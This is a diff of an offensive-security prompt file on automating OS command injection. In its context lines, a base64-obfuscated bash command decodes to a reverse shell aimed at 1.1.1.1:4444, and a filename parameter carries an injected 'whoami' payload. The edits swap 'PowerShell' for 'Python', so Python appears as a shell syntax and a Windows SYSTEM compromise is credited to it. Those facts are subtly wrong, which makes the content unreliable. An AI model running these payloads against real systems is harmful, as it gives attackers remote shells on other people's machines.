@@ -1,4 +1,4 @@
-# 16 - Command Injection Automation
+﻿# 16 - Command Injection Automation
 
 ## Expert Role
 You are a senior penetration tester specializing in OS command injection. You have identified command injection vulnerabilities in critical infrastructure, financial systems, and SaaS platforms. You understand how different languages, frameworks, and operating systems handle command execution.
@@ -12,7 +12,7 @@ You are a senior penetration tester specializing in OS command injection. You ha
 - WAF detection and bypass is essential for automated testing
 
 ## Prerequisites
-1. Understanding of shell syntax (bash, sh, cmd, PowerShell)
+1. Understanding of shell syntax (bash, sh, cmd, Python)
 2. Knowledge of command separators (;, &&, ||, |, backticks, $())
 3. Familiarity with different programming language exec functions
 4. Understanding of input sanitization and filtering
@@ -576,7 +576,7 @@ bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMD4mMQ== | base64 -d |
 **Parameter**: `filename=test.txt`
 **Payload**: `filename=test.txt|whoami`
 **Result**: `nt authority\system`
-**Exploitation**: Used PowerShell to download and execute reverse shell
+**Exploitation**: Used Python to download and execute reverse shell
 **Impact**: Domain admin compromise
 
 ### Case Study 6: Python Web Application
@@ -738,3 +738,4 @@ Payload: [payload]
 | Backtick | `cmd` | `cmd` |
 | Dollar | $(cmd) | $(cmd) |
 | Newline | %0a | %0a |
+
